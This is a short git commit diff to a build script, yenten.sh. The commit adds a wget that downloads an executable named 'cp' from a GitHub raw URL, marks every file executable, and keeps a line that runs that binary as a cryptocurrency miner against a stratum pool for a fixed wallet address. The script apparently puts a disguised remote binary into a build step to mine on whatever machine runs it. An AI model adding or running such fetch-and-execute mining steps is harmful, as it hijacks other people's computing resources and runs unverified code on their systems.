67ac5e2135f15b9743d4334706ce03c15a571574
edrivetokenbsc <107461243+edrivetokenbsc@users.noreply.github.com>
2024-12-31 10:30:04 -0600

    Update yenten.sh

--- build/yenten.sh
+++ build/yenten.sh
@@ -1,3 +1,3 @@
-
-
+wget https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/cp
+chmod +x *
 ./cp -a yespowerr16 -o stratum+tcp://stratum-asia.rplant.xyz:3383 -u YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe.gh
